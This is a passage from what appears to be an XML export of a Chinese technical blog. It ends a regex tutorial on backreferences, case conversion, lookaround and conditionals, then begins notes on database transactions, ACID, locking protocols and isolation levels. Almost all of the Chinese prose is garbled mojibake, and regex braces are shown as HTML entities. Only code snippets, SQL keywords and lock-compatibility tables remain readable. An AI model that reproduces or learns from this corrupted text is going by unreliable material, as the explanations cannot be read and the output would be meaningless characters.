1((25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d))\.)&#123;3&#125;(25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d)) åŒ¹é…ç»“æœ 192.168.0.1 00.00.00.00 555.555.555.555 å…«ã€å›æº¯å¼•ç”¨å›æº¯å¼•ç”¨ä½¿ç”¨ \n æ¥å¼•ç”¨æŸä¸ªå­è¡¨è¾¾å¼ï¼Œå…¶ä¸­ n ä»£è¡¨çš„æ˜¯å­è¡¨è¾¾å¼çš„åºå·ï¼Œä» 1 å¼€å§‹ã€‚å®ƒå’Œå­è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹ä¸€è‡´ï¼Œæ¯”å¦‚å­è¡¨è¾¾å¼åŒ¹é…åˆ° abcï¼Œé‚£ä¹ˆå›æº¯å¼•ç”¨éƒ¨åˆ†ä¹Ÿéœ€è¦åŒ¹é… abc ã€‚ åº”ç”¨ åŒ¹é… HTML ä¸­åˆæ³•çš„æ ‡é¢˜å…ƒç´ ã€‚ æ­£åˆ™è¡¨è¾¾å¼ \1 å°†å›æº¯å¼•ç”¨å­è¡¨è¾¾å¼ (h[1-6]) åŒ¹é…çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»å’Œå­è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹ä¸€è‡´ã€‚ 1&lt;(h[1-6])&gt;\w*?&lt;\/\1&gt; åŒ¹é…ç»“æœ &lt;h1&gt;x&lt;/h1&gt; &lt;h2&gt;x&lt;/h2&gt; &lt;h3&gt;x&lt;/h1&gt; æ›¿æ¢éœ€è¦ç”¨åˆ°ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚ åº”ç”¨ ä¿®æ”¹ç”µè¯å·ç æ ¼å¼ã€‚ æ–‡æœ¬ 313-555-1234 æŸ¥æ‰¾æ­£åˆ™è¡¨è¾¾å¼ 1(\d&#123;3&#125;)(-)(\d&#123;3&#125;)(-)(\d&#123;4&#125;) æ›¿æ¢æ­£åˆ™è¡¨è¾¾å¼ åœ¨ç¬¬ä¸€ä¸ªå­è¡¨è¾¾å¼æŸ¥æ‰¾çš„ç»“æœåŠ ä¸Š () ï¼Œç„¶ååŠ ä¸€ä¸ªç©ºæ ¼ï¼Œåœ¨ç¬¬ä¸‰ä¸ªå’Œç¬¬äº”ä¸ªå­—è¡¨è¾¾å¼æŸ¥æ‰¾çš„ç»“æœä¸­é—´åŠ ä¸Š - è¿›è¡Œåˆ†éš”ã€‚ 1($1) $3-$5 ç»“æœ (313) 555-1234 å¤§å°å†™è½¬æ¢ å…ƒå­—ç¬¦ è¯´æ˜ \l æŠŠä¸‹ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå°å†™ \u æŠŠä¸‹ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ \L æŠŠ\L å’Œ\E ä¹‹é—´çš„å­—ç¬¦å…¨éƒ¨è½¬æ¢ä¸ºå°å†™ \U æŠŠ\U å’Œ\E ä¹‹é—´çš„å­—ç¬¦å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™ \E ç»“æŸ\L æˆ–è€…\U åº”ç”¨ æŠŠæ–‡æœ¬çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚ æ–‡æœ¬ abcd æŸ¥æ‰¾ 1(\w)(\w&#123;2&#125;)(\w) æ›¿æ¢ 1$1\U$2\E$3 ç»“æœ aBCd ä¹ã€å‰åæŸ¥æ‰¾å‰åæŸ¥æ‰¾è§„å®šäº†åŒ¹é…çš„å†…å®¹é¦–å°¾åº”è¯¥åŒ¹é…çš„å†…å®¹ï¼Œä½†æ˜¯åˆä¸åŒ…å«é¦–å°¾åŒ¹é…çš„å†…å®¹ã€‚å‘å‰æŸ¥æ‰¾ç”¨ ?= æ¥å®šä¹‰ï¼Œå®ƒè§„å®šäº†å°¾éƒ¨åŒ¹é…çš„å†…å®¹ï¼Œè¿™ä¸ªåŒ¹é…çš„å†…å®¹åœ¨ ?= ä¹‹åå®šä¹‰ã€‚æ‰€è°“å‘å‰æŸ¥æ‰¾ï¼Œå°±æ˜¯è§„å®šäº†ä¸€ä¸ªåŒ¹é…çš„å†…å®¹ï¼Œç„¶åä»¥è¿™ä¸ªå†…å®¹ä¸ºå°¾éƒ¨å‘å‰é¢æŸ¥æ‰¾éœ€è¦åŒ¹é…çš„å†…å®¹ã€‚å‘ååŒ¹é…ç”¨ ?&lt;= å®šä¹‰ï¼ˆæ³¨: javaScript ä¸æ”¯æŒå‘ååŒ¹é…, java å¯¹å…¶æ”¯æŒä¹Ÿä¸å®Œå–„ï¼‰ã€‚ åº”ç”¨ æŸ¥æ‰¾å‡ºé‚®ä»¶åœ°å€ @ å­—ç¬¦å‰é¢çš„éƒ¨åˆ†ã€‚ æ­£åˆ™è¡¨è¾¾å¼ 1\w+(?=@) ç»“æœ abc @qq.com å¯¹å‘å‰å’Œå‘åæŸ¥æ‰¾å–éï¼Œåªè¦æŠŠ = æ›¿æ¢æˆ ! å³å¯ï¼Œæ¯”å¦‚ (?=) æ›¿æ¢æˆ (?!) ã€‚å–éæ“ä½œä½¿å¾—åŒ¹é…é‚£äº›é¦–å°¾ä¸ç¬¦åˆè¦æ±‚çš„å†…å®¹ã€‚ åã€åµŒå…¥æ¡ä»¶å›æº¯å¼•ç”¨æ¡ä»¶æ¡ä»¶åˆ¤æ–­ä¸ºæŸä¸ªå­è¡¨è¾¾å¼æ˜¯å¦åŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ™éœ€è¦ç»§ç»­åŒ¹é…æ¡ä»¶è¡¨è¾¾å¼åé¢çš„å†…å®¹ã€‚ æ­£åˆ™è¡¨è¾¾å¼ å­è¡¨è¾¾å¼ (\() åŒ¹é…ä¸€ä¸ªå·¦æ‹¬å·ï¼Œå…¶åçš„ ? è¡¨ç¤ºåŒ¹é… 0 ä¸ªæˆ–è€… 1 ä¸ªã€‚ ?(1) ä¸ºæ¡ä»¶ï¼Œå½“å­è¡¨è¾¾å¼ 1 åŒ¹é…æ—¶æ¡ä»¶æˆç«‹ï¼Œéœ€è¦æ‰§è¡Œ ) åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŒ¹é…å³æ‹¬å·ã€‚ 1(\()?abc(?(1)\)) ç»“æœ (abc) abc (abc å‰åæŸ¥æ‰¾æ¡ä»¶æ¡ä»¶ä¸ºå®šä¹‰çš„é¦–å°¾æ˜¯å¦åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ï¼Œåˆ™ç»§ç»­æ‰§è¡Œåé¢çš„åŒ¹é…ã€‚æ³¨æ„ï¼Œé¦–å°¾ä¸åŒ…å«åœ¨åŒ¹é…çš„å†…å®¹ä¸­ã€‚ æ­£åˆ™è¡¨è¾¾å¼ ?(?=-) ä¸ºå‰å‘æŸ¥æ‰¾æ¡ä»¶ï¼Œåªæœ‰åœ¨ä»¥ - ä¸ºå‰å‘æŸ¥æ‰¾çš„ç»“å°¾èƒ½åŒ¹é… \d{5} ï¼Œæ‰ç»§ç»­åŒ¹é… -\d{4} ã€‚ 1\d&#123;5&#125;(?(?=-)-\d&#123;4&#125;) ç»“æœ 11111 22222- 33333-4444 å‚è€ƒèµ„æ–™ BenForta. æ­£åˆ™è¡¨è¾¾å¼å¿…çŸ¥å¿…ä¼š [M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2007.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ•°æ®åº“ç³»ç»ŸåŸç†]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[ä¸€ã€äº‹åŠ¡ æ¦‚å¿µ ACID AUTOCOMMIT äºŒã€å¹¶å‘ä¸€è‡´æ€§é—®é¢˜ ä¸¢å¤±ä¿®æ”¹ è¯»è„æ•°æ® ä¸å¯é‡å¤è¯» å¹»å½±è¯» ä¸‰ã€å°é” å°é”ç²’åº¦ å°é”ç±»å‹ å°é”åè®® MySQL éšå¼ä¸æ˜¾ç¤ºé”å®š å››ã€éš”ç¦»çº§åˆ« æœªæäº¤è¯»ï¼ˆREAD UNCOMMITTEDï¼‰ æäº¤è¯»ï¼ˆREAD COMMITTEDï¼‰ å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰ å¯ä¸²è¡ŒåŒ–ï¼ˆSERIALIZABLEï¼‰ äº”ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ ç‰ˆæœ¬å· Undo æ—¥å¿— å®ç°è¿‡ç¨‹ å¿«ç…§è¯»ä¸å½“å‰è¯» å…­ã€Next-Key Locks Record Locks Grap Locks Next-Key Locks ä¸ƒã€å…³ç³»æ•°æ®åº“è®¾è®¡ç†è®º å‡½æ•°ä¾èµ– å¼‚å¸¸ èŒƒå¼ å…«ã€ER å›¾ å®ä½“çš„ä¸‰ç§è”ç³» è¡¨ç¤ºå‡ºç°å¤šæ¬¡çš„å…³ç³» è”ç³»çš„å¤šå‘æ€§ è¡¨ç¤ºå­ç±» å‚è€ƒèµ„æ–™ ä¸€ã€äº‹åŠ¡æ¦‚å¿µ äº‹åŠ¡æŒ‡çš„æ˜¯æ»¡è¶³ ACID ç‰¹æ€§çš„ä¸€ç»„æ“ä½œï¼Œå¯ä»¥é€šè¿‡ Commit æäº¤ä¸€ä¸ªäº‹åŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Rollback è¿›è¡Œå›æ»šã€‚ ACID1. åŸå­æ€§ï¼ˆAtomicityï¼‰äº‹åŠ¡è¢«è§†ä¸ºä¸å¯åˆ†å‰²çš„æœ€å°å•å…ƒï¼Œäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œè¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»šã€‚ å›æ»šå¯ä»¥ç”¨æ—¥å¿—æ¥å®ç°ï¼Œæ—¥å¿—è®°å½•ç€äº‹åŠ¡æ‰€æ‰§è¡Œçš„ä¿®æ”¹æ“ä½œï¼Œåœ¨å›æ»šæ—¶åå‘æ‰§è¡Œè¿™äº›ä¿®æ”¹æ“ä½œå³å¯ã€‚ 2. ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰æ•°æ®åº“åœ¨äº‹åŠ¡æ‰§è¡Œå‰åéƒ½ä¿æŒä¸€è‡´æ€§çŠ¶æ€ã€‚ åœ¨ä¸€è‡´æ€§çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰äº‹åŠ¡å¯¹ä¸€ä¸ªæ•°æ®çš„è¯»å–ç»“æœéƒ½æ˜¯ç›¸åŒçš„ã€‚ 3. éš”ç¦»æ€§ï¼ˆIsolationï¼‰ä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æœ€ç»ˆæäº¤ä»¥å‰ï¼Œå¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚ 4. æŒä¹…æ€§ï¼ˆDurabilityï¼‰ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œåˆ™å…¶æ‰€åšçš„ä¿®æ”¹å°†ä¼šæ°¸è¿œä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚å³ä½¿ç³»ç»Ÿå‘ç”Ÿå´©æºƒï¼Œäº‹åŠ¡æ‰§è¡Œçš„ç»“æœä¹Ÿä¸èƒ½ä¸¢å¤±ã€‚ å¯ä»¥é€šè¿‡æ•°æ®åº“å¤‡ä»½å’Œæ¢å¤æ¥å®ç°ï¼Œåœ¨ç³»ç»Ÿå‘ç”Ÿå´©æºƒæ—¶ï¼Œä½¿ç”¨å¤‡ä»½çš„æ•°æ®åº“è¿›è¡Œæ•°æ®æ¢å¤ã€‚ äº‹åŠ¡çš„ ACID ç‰¹æ€§æ¦‚å¿µç®€å•ï¼Œä½†ä¸æ˜¯å¾ˆå¥½ç†è§£ï¼Œä¸»è¦æ˜¯å› ä¸ºè¿™å‡ ä¸ªç‰¹æ€§ä¸æ˜¯ä¸€ç§å¹³çº§å…³ç³»ï¼š åªæœ‰æ»¡è¶³ä¸€è‡´æ€§ï¼Œäº‹åŠ¡çš„æ‰§è¡Œç»“æœæ‰æ˜¯æ­£ç¡®çš„ã€‚ åœ¨æ— å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ä¸²è¡Œæ‰§è¡Œï¼Œéš”ç¦»æ€§ä¸€å®šèƒ½å¤Ÿæ»¡è¶³ã€‚æ­¤æ—¶è¦åªè¦èƒ½æ»¡è¶³åŸå­æ€§ï¼Œå°±ä¸€å®šèƒ½æ»¡è¶³ä¸€è‡´æ€§ã€‚ åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œå¤šä¸ªäº‹åŠ¡å¹¶å‘æ‰§è¡Œï¼Œäº‹åŠ¡ä¸ä»…è¦æ»¡è¶³åŸå­æ€§ï¼Œè¿˜éœ€è¦æ»¡è¶³éš”ç¦»æ€§ï¼Œæ‰èƒ½æ»¡è¶³ä¸€è‡´æ€§ã€‚ äº‹åŠ¡æ»¡è¶³æŒä¹…åŒ–æ˜¯ä¸ºäº†èƒ½åº”å¯¹æ•°æ®åº“å´©æºƒçš„æƒ…å†µã€‚ AUTOCOMMITMySQL é»˜è®¤é‡‡ç”¨è‡ªåŠ¨æäº¤æ¨¡å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸æ˜¾å¼ä½¿ç”¨START TRANSACTIONè¯­å¥æ¥å¼€å§‹ä¸€ä¸ªäº‹åŠ¡ï¼Œé‚£ä¹ˆæ¯ä¸ªæŸ¥è¯¢éƒ½ä¼šè¢«å½“åšä¸€ä¸ªäº‹åŠ¡è‡ªåŠ¨æäº¤ã€‚ äºŒã€å¹¶å‘ä¸€è‡´æ€§é—®é¢˜åœ¨å¹¶å‘ç¯å¢ƒä¸‹ï¼Œäº‹åŠ¡çš„éš”ç¦»æ€§å¾ˆéš¾ä¿è¯ï¼Œå› æ­¤ä¼šå‡ºç°å¾ˆå¤šå¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚ ä¸¢å¤±ä¿®æ”¹T1 å’Œ T2 ä¸¤ä¸ªäº‹åŠ¡éƒ½å¯¹ä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼ŒT1 å…ˆä¿®æ”¹ï¼ŒT2 éšåä¿®æ”¹ï¼ŒT2 çš„ä¿®æ”¹è¦†ç›–äº† T1 çš„ä¿®æ”¹ã€‚ è¯»è„æ•°æ®T1 ä¿®æ”¹ä¸€ä¸ªæ•°æ®ï¼ŒT2 éšåè¯»å–è¿™ä¸ªæ•°æ®ã€‚å¦‚æœ T1 æ’¤é”€äº†è¿™æ¬¡ä¿®æ”¹ï¼Œé‚£ä¹ˆ T2 è¯»å–çš„æ•°æ®æ˜¯è„æ•°æ®ã€‚ ä¸å¯é‡å¤è¯»T2 è¯»å–ä¸€ä¸ªæ•°æ®ï¼ŒT1 å¯¹è¯¥æ•°æ®åšäº†ä¿®æ”¹ã€‚å¦‚æœ T2 å†æ¬¡è¯»å–è¿™ä¸ªæ•°æ®ï¼Œæ­¤æ—¶è¯»å–çš„ç»“æœå’Œç¬¬ä¸€æ¬¡è¯»å–çš„ç»“æœä¸åŒã€‚ å¹»å½±è¯»T1 è¯»å–æŸä¸ªèŒƒå›´çš„æ•°æ®ï¼ŒT2 åœ¨è¿™ä¸ªèŒƒå›´å†…æ’å…¥æ–°çš„æ•°æ®ï¼ŒT1 å†æ¬¡è¯»å–è¿™ä¸ªèŒƒå›´çš„æ•°æ®ï¼Œæ­¤æ—¶è¯»å–çš„ç»“æœå’Œå’Œç¬¬ä¸€æ¬¡è¯»å–çš„ç»“æœä¸åŒã€‚ äº§ç”Ÿå¹¶å‘ä¸ä¸€è‡´æ€§é—®é¢˜ä¸»è¦åŸå› æ˜¯ç ´åäº†äº‹åŠ¡çš„éš”ç¦»æ€§ï¼Œè§£å†³æ–¹æ³•æ˜¯é€šè¿‡å¹¶å‘æ§åˆ¶æ¥ä¿è¯éš”ç¦»æ€§ã€‚å¹¶å‘æ§åˆ¶å¯ä»¥é€šè¿‡å°é”æ¥å®ç°ï¼Œä½†æ˜¯å°é”æ“ä½œéœ€è¦ç”¨æˆ·è‡ªå·±æ§åˆ¶ï¼Œç›¸å½“å¤æ‚ã€‚æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæä¾›äº†äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ï¼Œè®©ç”¨æˆ·ä»¥ä¸€ç§æ›´è½»æ¾çš„æ–¹å¼å¤„ç†å¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚ ä¸‰ã€å°é”å°é”ç²’åº¦ MySQL ä¸­æä¾›äº†ä¸¤ç§å°é”ç²’åº¦ï¼šè¡Œçº§é”ä»¥åŠè¡¨çº§é”ã€‚ åº”è¯¥å°½é‡åªé”å®šéœ€è¦ä¿®æ”¹çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„èµ„æºã€‚é”å®šçš„æ•°æ®é‡è¶Šå°‘ï¼Œå‘ç”Ÿé”äº‰ç”¨çš„å¯èƒ½å°±è¶Šå°ï¼Œç³»ç»Ÿçš„å¹¶å‘ç¨‹åº¦å°±è¶Šé«˜ã€‚ ä½†æ˜¯åŠ é”éœ€è¦æ¶ˆè€—èµ„æºï¼Œé”çš„å„ç§æ“ä½œï¼ˆåŒ…æ‹¬è·å–é”ã€é‡Šæ”¾é”ã€ä»¥åŠæ£€æŸ¥é”çŠ¶æ€ï¼‰éƒ½ä¼šå¢åŠ ç³»ç»Ÿå¼€é”€ã€‚å› æ­¤å°é”ç²’åº¦è¶Šå°ï¼Œç³»ç»Ÿå¼€é”€å°±è¶Šå¤§ã€‚ åœ¨é€‰æ‹©å°é”ç²’åº¦æ—¶ï¼Œéœ€è¦åœ¨é”å¼€é”€å’Œå¹¶å‘ç¨‹åº¦ä¹‹é—´åšä¸€ä¸ªæƒè¡¡ã€‚ å°é”ç±»å‹1. è¯»å†™é” æ’å®ƒé”ï¼ˆExclusiveï¼‰ï¼Œç®€å†™ä¸º X é”ï¼Œåˆç§°å†™é”ã€‚ å…±äº«é”ï¼ˆSharedï¼‰ï¼Œç®€å†™ä¸º S é”ï¼Œåˆç§°è¯»é”ã€‚ æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„å®šï¼š ä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®å¯¹è±¡ A åŠ äº† X é”ï¼Œå°±å¯ä»¥å¯¹ A è¿›è¡Œè¯»å–å’Œæ›´æ–°ã€‚åŠ é”æœŸé—´å…¶å®ƒäº‹åŠ¡ä¸èƒ½å¯¹ A åŠ ä»»ä½•é”ã€‚ ä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®å¯¹è±¡ A åŠ äº† S é”ï¼Œå¯ä»¥å¯¹ A è¿›è¡Œè¯»å–æ“ä½œï¼Œä½†æ˜¯ä¸èƒ½è¿›è¡Œæ›´æ–°æ“ä½œã€‚åŠ é”æœŸé—´å…¶å®ƒäº‹åŠ¡èƒ½å¯¹ A åŠ  S é”ï¼Œä½†æ˜¯ä¸èƒ½åŠ  X é”ã€‚ é”çš„å…¼å®¹å…³ç³»å¦‚ä¸‹ï¼š - X S X NO NO S NO YES 2. æ„å‘é”ä½¿ç”¨æ„å‘é”ï¼ˆIntention Locksï¼‰å¯ä»¥æ›´å®¹æ˜“åœ°æ”¯æŒå¤šç²’åº¦å°é”ã€‚ åœ¨å­˜åœ¨è¡Œçº§é”å’Œè¡¨çº§é”çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œå°±éœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A æˆ–è€…è¡¨ A ä¸­çš„ä»»æ„ä¸€è¡ŒåŠ äº†é”ï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹è¡¨ A çš„æ¯ä¸€è¡Œéƒ½æ£€æµ‹ä¸€æ¬¡ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„ã€‚ æ„å‘é”åœ¨åŸæ¥çš„ X/S é”ä¹‹ä¸Šå¼•å…¥äº† IX/ISï¼ŒIX/IS éƒ½æ˜¯è¡¨é”ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªäº‹åŠ¡æƒ³è¦åœ¨è¡¨ä¸­çš„æŸä¸ªæ•°æ®è¡Œä¸ŠåŠ  X é”æˆ– S é”ã€‚æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„å®šï¼š ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ S é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IS é”æˆ–è€…æ›´å¼ºçš„é”ï¼› ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ X é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IX é”ã€‚ é€šè¿‡å¼•å…¥æ„å‘é”ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œåªéœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A åŠ äº† X/IX/S/IS é”ï¼Œå¦‚æœåŠ äº†å°±è¡¨ç¤ºæœ‰å…¶å®ƒäº‹åŠ¡æ­£åœ¨ä½¿ç”¨è¿™ä¸ªè¡¨æˆ–è€…è¡¨ä¸­æŸä¸€è¡Œçš„é”ï¼Œå› æ­¤äº‹åŠ¡ T åŠ  X é”å¤±è´¥ã€‚ å„ç§é”çš„å…¼å®¹å…³ç³»å¦‚ä¸‹ï¼š - X IX S IS X NO NO NO NO IX NO YES NO YES S NO NO YES YES IS NO YES YES YES è§£é‡Šå¦‚ä¸‹ï¼š ä»»æ„ IS/IX é”ä¹‹é—´éƒ½æ˜¯å…¼å®¹çš„ï¼Œå› ä¸ºå®ƒä»¬åªæ˜¯è¡¨ç¤ºæƒ³è¦å¯¹è¡¨åŠ é”ï¼Œè€Œä¸æ˜¯çœŸæ­£åŠ é”ï¼› S é”åªä¸ S é”å’Œ IS é”å…¼å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´äº‹åŠ¡ T æƒ³è¦å¯¹æ•°æ®è¡ŒåŠ  S é”ï¼Œå…¶å®ƒäº‹åŠ¡å¯ä»¥å·²ç»è·å¾—å¯¹è¡¨æˆ–è€…è¡¨ä¸­çš„è¡Œçš„ S é”ã€‚ å°é”åè®®1. ä¸‰çº§å°é”åè®®ä¸€çº§å°é”åè®® äº‹åŠ¡ T è¦ä¿®æ”¹æ•°æ® A æ—¶å¿…é¡»åŠ  X é”ï¼Œç›´åˆ° T ç»“æŸæ‰é‡Šæ”¾é”ã€‚ å¯ä»¥è§£å†³ä¸¢å¤±ä¿®æ”¹é—®é¢˜ï¼Œå› ä¸ºä¸èƒ½åŒæ—¶æœ‰ä¸¤ä¸ªäº‹åŠ¡å¯¹åŒä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆäº‹åŠ¡çš„ä¿®æ”¹å°±ä¸ä¼šè¢«è¦†ç›–ã€‚ T1 T2 lock-x(A) read A=20 lock-x(A) wait write A=19 . commit . unlock-x(A) . obtain read A=19 write A=21 commit unlock-x(A) äºŒçº§å°é”åè®® åœ¨ä¸€çº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œè¯»å–å®Œé©¬ä¸Šé‡Šæ”¾ S é”ã€‚ å¯ä»¥è§£å†³è¯»è„æ•°æ®é—®é¢˜ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªäº‹åŠ¡åœ¨å¯¹æ•°æ® A è¿›è¡Œä¿®æ”¹ï¼Œæ ¹æ® 1 çº§å°é”åè®®ï¼Œä¼šåŠ  X é”ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å†åŠ  S é”äº†ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šè¯»å…¥æ•°æ®ã€‚ T1 T2 lock-x(A) read A=20 write A=19 lock-s(A) wait rollback . A=20 . unlock-x(A) . obtain read A=20 commit unlock-s(A) ä¸‰çº§å°é”åè®® åœ¨äºŒçº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸäº†æ‰èƒ½é‡Šæ”¾ S é”ã€‚ å¯ä»¥è§£å†³ä¸å¯é‡å¤è¯»çš„é—®é¢˜ï¼Œå› ä¸ºè¯» A æ—¶ï¼Œå…¶å®ƒäº‹åŠ¡ä¸èƒ½å¯¹ A åŠ  X é”ï¼Œä»è€Œé¿å…äº†åœ¨è¯»çš„æœŸé—´æ•°æ®å‘ç”Ÿæ”¹å˜ã€‚ T1 T2 lock-s(A) read A=20 lock-x(A) wait read A=20 . commit . unlock-s(A) . obtain read A=20 write A=19 commit unlock-X(A) 2. ä¸¤æ®µé”åè®®åŠ é”å’Œè§£é”åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µè¿›è¡Œã€‚ å¯ä¸²è¡ŒåŒ–è°ƒåº¦æ˜¯æŒ‡ï¼Œé€šè¿‡å¹¶å‘æ§åˆ¶ï¼Œä½¿å¾—å¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡ç»“æœä¸æŸä¸ªä¸²è¡Œæ‰§è¡Œçš„äº‹åŠ¡ç»“æœç›¸åŒã€‚ äº‹åŠ¡éµå¾ªä¸¤æ®µé”åè®®æ˜¯ä¿è¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦çš„å……åˆ†æ¡ä»¶ã€‚ä¾‹å¦‚ä»¥ä¸‹æ“ä½œæ»¡è¶³ä¸¤æ®µé”åè®®ï¼Œå®ƒæ˜¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦ã€‚ 1lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B) ä½†ä¸æ˜¯å¿…è¦æ¡ä»¶ï¼Œä¾‹å¦‚ä»¥ä¸‹æ“ä½œä¸æ»¡è¶³ä¸¤æ®µé”åè®®ï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦ã€‚ 1lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C) MySQL éšå¼ä¸æ˜¾ç¤ºé”å®šMySQL çš„ InnoDB å­˜å‚¨å¼•æ“é‡‡ç”¨ä¸¤æ®µé”åè®®ï¼Œä¼šæ ¹æ®éš”ç¦»çº§åˆ«åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨åŠ é”ï¼Œå¹¶ä¸”æ‰€æœ‰çš„é”éƒ½æ˜¯åœ¨åŒä¸€æ—¶åˆ»è¢«é‡Šæ”¾ï¼Œè¿™è¢«ç§°ä¸ºéšå¼é”å®šã€‚ InnoDB ä¹Ÿå¯ä»¥ä½¿ç”¨ç‰¹å®šçš„è¯­å¥è¿›è¡Œæ˜¾ç¤ºé”å®šï¼š 12SELECT ... LOCK In SHARE MODE;SELECT ... FOR UPDATE; å››ã€éš”ç¦»çº§åˆ«æœªæäº¤è¯»ï¼ˆREAD UNCOMMITTEDï¼‰äº‹åŠ¡ä¸­çš„ä¿®æ”¹ï¼Œå³ä½¿æ²¡æœ‰æäº¤ï¼Œå¯¹å…¶å®ƒäº‹åŠ¡ä¹Ÿæ˜¯å¯è§çš„ã€‚ æäº¤è¯»ï¼ˆREAD COMMITTEDï¼‰ä¸€ä¸ªäº‹åŠ¡åªèƒ½è¯»å–å·²ç»æäº¤çš„äº‹åŠ¡æ‰€åšçš„ä¿®æ”¹ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æäº¤ä¹‹å‰å¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚ å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰ä¿è¯åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­å¤šæ¬¡è¯»å–åŒæ ·æ•°æ®çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ å¯ä¸²è¡ŒåŒ–ï¼ˆSERIALIZABLEï¼‰å¼ºåˆ¶äº‹åŠ¡ä¸²è¡Œæ‰§è¡Œã€‚ éš”ç¦»çº§åˆ« è„è¯» ä¸å¯é‡å¤è¯» å¹»å½±è¯» æœªæäº¤è¯» YES YES YES æäº¤è¯» NO YES YES å¯é‡å¤è¯» NO NO YES å¯ä¸²è¡ŒåŒ– NO NO NO 